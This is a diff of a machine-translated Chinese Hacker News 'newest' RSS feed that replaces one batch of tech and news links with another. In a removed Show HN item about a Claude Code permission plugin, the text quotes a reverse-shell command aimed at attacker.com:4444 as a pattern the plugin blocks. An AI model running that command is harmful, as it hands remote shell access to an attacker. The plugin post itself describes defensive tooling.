@@ -4,128 +4,120 @@
     <title>黑客新闻：最新</title>
     <link>https://news.ycombinator.com/newest</link>
     <description>黑客新闻 RSS</description>
-    <lastBuildDate>Fri, 06 Feb 2026 06:55:56 GMT</lastBuildDate>
+    <lastBuildDate>Fri, 06 Feb 2026 09:43:16 GMT</lastBuildDate>
     <item>
-      <title>GitButler CLI – Butler 的日志</title>
-      <link>https://blog.gitbutler.com/but-cli</link>
-      <description><![CDATA[文章网址：https://blog.gitbutler.com/but-cli
-评论网址：https://news.ycombinator.com/item?id=46909917
-积分：1
-# 条评论：0]]></description>
-      <guid>https://blog.gitbutler.com/but-cli</guid>
-      <pubDate>Fri, 06 Feb 2026 06:54:03 GMT</pubDate>
-    </item>
-    <item>
-      <title>深入探讨：Claude Code 的 /Insights 命令如何工作</title>
-      <link>https://www.zolkos.com/2026/02/04/deep-dive-how-claude-codes-insights-command-works.html</link>
-      <description><![CDATA[文章网址：https://www.zolkos.com/2026/02/04/deep-dive-how-claude-codes-insights-command-works.html
-评论网址：https://news.ycombinator.com/item?id=46909906
-积分：1
-# 条评论：0]]></description>
-      <guid>https://www.zolkos.com/2026/02/04/deep-dive-how-claude-codes-insights-command-works.html</guid>
-      <pubDate>Fri, 06 Feb 2026 06:52:25 GMT</pubDate>
-    </item>
-    <item>
-      <title>联邦规则取消了对高级职业雇员的公务员保护</title>
-      <link>https://natlawreview.com/article/new-federal-rule-removes-civil-service-protections-high-ranking-career-employees</link>
-      <description><![CDATA[文章网址：https://natlawreview.com/article/new-federal-rule-removes-civil-service-protections-high-ranking-career-employees
-评论网址：https://news.ycombinator.com/item?id=46909904
-积分：1
-# 条评论：0]]></description>
-      <guid>https://natlawreview.com/article/new-federal-rule-removes-civil-service-protections-high-ranking-career-employees</guid>
-      <pubDate>Fri, 06 Feb 2026 06:52:16 GMT</pubDate>
-    </item>
-    <item>
-      <title>PaperBanana – 利用 AI 生成可供发表的学术数据</title>
-      <link>https://www.paperbanana.xyz/</link>
-      <description><![CDATA[文章网址：https://www.paperbanana.xyz/
-评论网址：https://news.ycombinator.com/item?id=46909889
+      <title>将心理噪音转化为清晰、可操作的后续步骤</title>
+      <link>https://www.heyecho.app/</link>
+      <description><![CDATA[文章网址：https://www.heyecho.app/
+评论网址：https://news.ycombinator.com/item?id=46910784
 积分：1
 # 条评论：1]]></description>
-      <guid>https://www.paperbanana.xyz/</guid>
-      <pubDate>Fri, 06 Feb 2026 06:50:51 GMT</pubDate>
+      <guid>https://www.heyecho.app/</guid>
+      <pubDate>Fri, 06 Feb 2026 09:29:20 GMT</pubDate>
     </item>
     <item>
-      <title>显示 HN：危险地跳过权限，如果它不在沙箱之外写入</title>
-      <link>https://github.com/ContextFort-AI/Runtime-Controls</link>
-      <description><![CDATA[如果命令的损害半径仅限于沙箱，则权限提示会很吵。如果它会在外部环境中进行更改或与网络通信，我希望获得批准。我构建了一个 Claude Code 插件，该插件：(https://postimg.cc/crvWLNRR)1) 始终提示“write-external”命令（数据库更新、API 调用、远程写入），例如scp、curl -X POST、git Push、sqlite3 等。 2) 阻止已知的恶意软件模式，例如反向 shell 模式(bash -i &gt;&amp; /dev/tcp/attacker.com/4444 0&gt;&amp;1) 或写入 Dotfile它使用 PreTool 挂钩在从“写外部”注册表执行之前查找命令。如果丢失，俳句模型会读取其手册/帮助页面，并使用可能发生外部写入的使用模式更新注册表。要对注册表进行手动更改，您可以提示 Claude“将 mytool 标记为安全”或“添加curl 以始终询问”。
+      <title>根据人工智能生成的警察报告，警察变成了青蛙</title>
+      <link>https://www.forbes.com/sites/larsdaniel/2026/01/04/cop-transforms-into-frog-according-to-ai-generated-police-report/</link>
+      <description><![CDATA[文章网址： https://www.forbes.com/sites/larsdaniel/2026/01/04/cop-transforms-into-frog-according-to-ai- generated-police-report/
+评论网址：https://news.ycombinator.com/item?id=46910772
+积分：1
+# 条评论：0]]></description>
+      <guid>https://www.forbes.com/sites/larsdaniel/2026/01/04/cop-transforms-into-frog-according-to-ai-generated-police-report/</guid>
+      <pubDate>Fri, 06 Feb 2026 09:27:52 GMT</pubDate>
+    </item>
+    <item>
+      <title>Show HN: Purple Word – 一款新的单词益智游戏</title>
+      <link>https://purpleword.com</link>
+      <description><![CDATA[文章网址：https://purpleword.com
+评论网址：https://news.ycombinator.com/item?id=46910764
+积分：3
+# 条评论：0]]></description>
+      <guid>https://purpleword.com</guid>
+      <pubDate>Fri, 06 Feb 2026 09:27:01 GMT</pubDate>
+    </item>
+    <item>
+      <title>在运行时保护 AI 系统的经验教训（代理、MCP、LLM）</title>
+      <link>https://news.ycombinator.com/item?id=46910753</link>
+      <description><![CDATA[去年，我们在与在生产中部署人工智能的团队合作时注意到了一种模式。难题不是模型选择或提示质量。
+他们在部署后出现。代理开始调用没人记得连接过的工具。
+法学硕士通过日志中不明显的链访问内部 API。
+执行身份与用户身份不同。
+MCP 服务器变得安静但关键的控制平面。大多数现有的安全假设在这些场景中都被打破，因为它们假设：静态服务明确的所有权单跳执行预定义的边界AI 系统违反了所有这些。我们最近花了一周的时间记录和交付围绕 AI 系统的运行时可见性和治理的解决方案，重点关注代理、MCP 服务器、API 和模型一旦上线后的实际行为方式。而不是高级框架，我们试图回答实际问题：现在存在什么？谁在代表谁行事？正在调用哪些工具，以什么顺序调用？在实际执行过程中数据在哪里流动？我们写下了所学到的知识以及我们在此处构建的内容：
+https://www.levo.ai/resources/product-release/launch-week-2026-recap并不是将其发布为“发布”，更多的是作为讨论的开始。
+好奇一旦 AI 系统不再是演示并开始成为基础设施，其他人会如何考虑保护它们。
 &lt;小时/&gt;
-评论网址：https://news.ycombinator.com/item?id=46909878
-积分：1
-# 条评论：0]]></description>
-      <guid>https://github.com/ContextFort-AI/Runtime-Controls</guid>
-      <pubDate>Fri, 06 Feb 2026 06:48:22 GMT</pubDate>
-    </item>
-    <item>
-      <title>Greg Brockman：“软件开发正在经历复兴”</title>
-      <link>https://twitter.com/gdb/status/2019566641491963946</link>
-      <description><![CDATA[文章网址：https://twitter.com/gdb/status/2019566641491963946
-评论网址：https://news.ycombinator.com/item?id=46909874
-积分：1
-# 条评论：0]]></description>
-      <guid>https://twitter.com/gdb/status/2019566641491963946</guid>
-      <pubDate>Fri, 06 Feb 2026 06:48:18 GMT</pubDate>
-    </item>
-    <item>
-      <title>Show HN：Hive Agent – 在您的应用程序中嵌入类似 Claude 代码的 AI 代理</title>
-      <link>https://news.ycombinator.com/item?id=46909873</link>
-      <description><![CDATA[嘿，HN，我每天都在使用 Claude Code 进行构建，并不断思考：如果我能够为我的用户提供相同的体验（一个探索上下文、计划、执行工具和构建事物的 AI 代理），但将其原生嵌入到我自己的应用程序中，会怎么样？因此，我构建了 *Hive Agent*，一个开源 TypeScript 框架，它将核心 Claude Code 架构重现为一个可以集成到任何应用程序中的库。*它的作用：*- *工作空间系统* - 通过虚拟文件系统为代理提供任何上下文。向其提供用户数据、项目文件、API 响应——无论您的应用程序需要什么。代理使用类似 bash 的命令读取、写入和搜索它。
-- *内置探索和计划代理* — 就像 Claude Code 一样，Hive 会自动生成子代理，以便在采取行动之前调查工作区数据，并为复杂任务设计分步计划。
-- *子代理编排* - 生成具有不同模型（Claude、OpenAI）、不同工具和结构化 I/O 的专业代理。研究代理可以使用GPT-4，而主要代理则使用Claude。
-- *自定义工具* — 定义您的应用程序所需的任何工具。 API 调用、数据库查询、浏览器自动化、文档生成——代理根据需要调用它们。
-- *无状态和无服务器就绪* — 无持久状态。适用于 Firebase Functions、Vercel、AWS Lambda。传入历史，取出历史。
-- *执行跟踪和成本跟踪* — 完整的分层跟踪，包含每个模型的代币使用情况和成本细分。
-- *交互模式* - 代理可以暂停并提出澄清问题，就像 Claude Code 所做的那样。*您可以用它构建什么：*- 适用于您平台的 AI 编码助手
-- 了解用户上下文的文档生成器
-- 项目脚手架工具
-- 支持代理访问您的内部 API
-- 人工智能需要探索数据、计划和行动的任何工作流程*简单示例：*```打字稿
-从 &#39;@alexnetrebskii/hive-agent&#39; 导入 { Hive, ClaudeProvider }const agent = new Hive({
-  systemPrompt: &#39;您是项目生成器...&#39;,
-  工具：[myApiTool、myDbTool]、
-  llm: new ClaudeProvider({ apiKey: process.env.ANTHROPIC_API_KEY }),
-  工作区：新工作区（{
-    路径：{&#39;user/requirements.json&#39;：{值：userReqs}}
-  })
-})const result = wait agent.run(&#39;根据我的要求创建一个新项目&#39;)
-```代理将探索工作空间，规划方法，创建文件，调用您的工具 - 全部都是自主的。*链接：*- GitHub：https://github.com/anetrebskii/hive-agent
-- 安装：`pnpm add @alexnetrebskii/hive-agent`
-- 麻省理工学院许可我希望得到任何构建代理支持功能的人的反馈。您想要内置哪些工具或模式？尝试一下，让我知道哪里出了问题。
-&lt;小时/&gt;
-评论网址：https://news.ycombinator.com/item?id=46909873
-积分：1
-# 条评论：0]]></description>
-      <guid>https://news.ycombinator.com/item?id=46909873</guid>
-      <pubDate>Fri, 06 Feb 2026 06:47:53 GMT</pubDate>
-    </item>
-    <item>
-      <title>询问 HN：对于那些想要搬迁的人来说，湾区的就业市场怎么样？</title>
-      <link>https://news.ycombinator.com/item?id=46909866</link>
-      <description><![CDATA[评论网址：https://news.ycombinator.com/item?id=46909866
+评论网址：https://news.ycombinator.com/item?id=46910753
 积分：1
 # 条评论：1]]></description>
-      <guid>https://news.ycombinator.com/item?id=46909866</guid>
-      <pubDate>Fri, 06 Feb 2026 06:46:18 GMT</pubDate>
+      <guid>https://news.ycombinator.com/item?id=46910753</guid>
+      <pubDate>Fri, 06 Feb 2026 09:25:59 GMT</pubDate>
     </item>
     <item>
-      <title>我们使用真实工作数据分析了欧盟 IT 薪资和招聘趋势</title>
-      <link>https://old.reddit.com/r/eutech/comments/1qtqly5/we_analyzed_eu_it_salaries_and_hiring_trends/</link>
-      <description><![CDATA[文章网址：https://old.reddit.com/r/eutech/comments/1qtqly5/we_analyzed_eu_it_salaries_and_hiring_trends/
-评论网址：https://news.ycombinator.com/item?id=46909825
+      <title>显示 HN：云挖矿应用程序 UI（Android 和 Windows）</title>
+      <link>https://smaralddm.github.io/extremeapp/</link>
+      <description><![CDATA[Extreme Miner 是一款功能强大的云加密货币挖矿应用程序！
+下载创建您的帐户并开始挖矿！
+&lt;小时/&gt;
+评论网址：https://news.ycombinator.com/item?id=46910751
+积分：1
+# 条评论：0]]></description>
+      <guid>https://smaralddm.github.io/extremeapp/</guid>
+      <pubDate>Fri, 06 Feb 2026 09:25:40 GMT</pubDate>
+    </item>
+    <item>
+      <title>Show HN：Spip – 开源自托管 TCP 网络传感器</title>
+      <link>https://github.com/StefanGrimminck/Spip-Go</link>
+      <description><![CDATA[Spip 是一种轻量级、低交互的网络蜜罐传感器。它侦听任意传入 TCP 流量（普通和 TLS），捕获扫描仪和机器人发送的内容，并将每个连接记录为结构化 JSON（ECS 形状），以便轻松摄取到您的 SIEM 或数据湖中。
+&lt;小时/&gt;
+评论网址：https://news.ycombinator.com/item?id=46910748
 积分：2
 # 条评论：0]]></description>
-      <guid>https://old.reddit.com/r/eutech/comments/1qtqly5/we_analyzed_eu_it_salaries_and_hiring_trends/</guid>
-      <pubDate>Fri, 06 Feb 2026 06:39:09 GMT</pubDate>
+      <guid>https://github.com/StefanGrimminck/Spip-Go</guid>
+      <pubDate>Fri, 06 Feb 2026 09:25:02 GMT</pubDate>
     </item>
     <item>
-      <title>在事件诊断竞赛中击败 AI – 本周六奖金 225 美元</title>
-      <link>https://incidentfox.slack.com/join/shared_invite/zt-3ojlxvs46-xuEJEplqBHPlymxtzQi8KQ?nojsmode=1</link>
-      <description><![CDATA[文章网址： https://incidentfox.slack.com/join/shared_invite/zt-3ojlxvs46-xuEJEplqBHPlymxtzQi8KQ?nojsmode=1
-评论网址：https://news.ycombinator.com/item?id=46909823
+      <title>释放 Google 趋势的真正力量</title>
+      <link>https://daily-trending.org</link>
+      <description><![CDATA[文章网址：https://daily-trending.org
+评论网址：https://news.ycombinator.com/item?id=46910738
 积分：1
 # 条评论：1]]></description>
-      <guid>https://incidentfox.slack.com/join/shared_invite/zt-3ojlxvs46-xuEJEplqBHPlymxtzQi8KQ?nojsmode=1</guid>
-      <pubDate>Fri, 06 Feb 2026 06:38:56 GMT</pubDate>
+      <guid>https://daily-trending.org</guid>
+      <pubDate>Fri, 06 Feb 2026 09:23:46 GMT</pubDate>
+    </item>
+    <item>
+      <title>Show HN：我制作了一款供情侣交流的益智游戏</title>
+      <link>https://lovepuzzle.com/</link>
+      <description><![CDATA[嗨，HN，Lovepuzzles 最初是作为送给我女朋友的周年纪念礼物。我为她构建了一个小型拼图体验，解决拼图后会逐渐显示出真正的数字代码。该密码解锁了我给她的物理组合挂锁。她真的很喜欢它，这让我想知道这个想法是否可以超越我们两个人的范围。因此，我对其进行了清理并公开发布。从构建者的角度来看，我故意让事情变得简单：基于网络，无需安装应用程序，并专注于一种清晰的体验，而不是功能丰富的产品。现在还很早，我非常感谢以下方面的反馈：
+– 当您登陆网站时，概念是否清晰
+– 如果体验感觉有意义或有噱头
+– 任何令人困惑或不必要的内容链接：https://lovepuzzles.com感谢您的浏览。
+&lt;小时/&gt;
+评论网址：https://news.ycombinator.com/item?id=46910737
+积分：1
+# 条评论：0]]></description>
+      <guid>https://lovepuzzle.com/</guid>
+      <pubDate>Fri, 06 Feb 2026 09:23:21 GMT</pubDate>
+    </item>
+    <item>
+      <title>胯部增强：冬奥会上的最新争议</title>
+      <link>https://news.sky.com/story/crotch-enhancements-the-latest-controversy-at-the-winter-olympics-13503862</link>
+      <description><![CDATA[文章网址：https://news.sky.com/story/crotch-enhancements-the-latest-controversy-at-the-winter-olympics-13503862
+评论网址：https://news.ycombinator.com/item?id=46910734
+积分：1
+# 条评论：0]]></description>
+      <guid>https://news.sky.com/story/crotch-enhancements-the-latest-controversy-at-the-winter-olympics-13503862</guid>
+      <pubDate>Fri, 06 Feb 2026 09:21:54 GMT</pubDate>
+    </item>
+    <item>
+      <title>一些 90 年代 SPARC 克隆版的完全糟糕的广告</title>
+      <link>https://buttondown.com/suchbadtechads/archive/integrix/</link>
+      <description><![CDATA[文章网址：https://buttondown.com/suchbadtechads/archive/integrix/
+评论网址：https://news.ycombinator.com/item?id=46910731
+积分：1
+# 条评论：0]]></description>
+      <guid>https://buttondown.com/suchbadtechads/archive/integrix/</guid>
+      <pubDate>Fri, 06 Feb 2026 09:21:44 GMT</pubDate>
     </item>
     </channel>
 </rss>
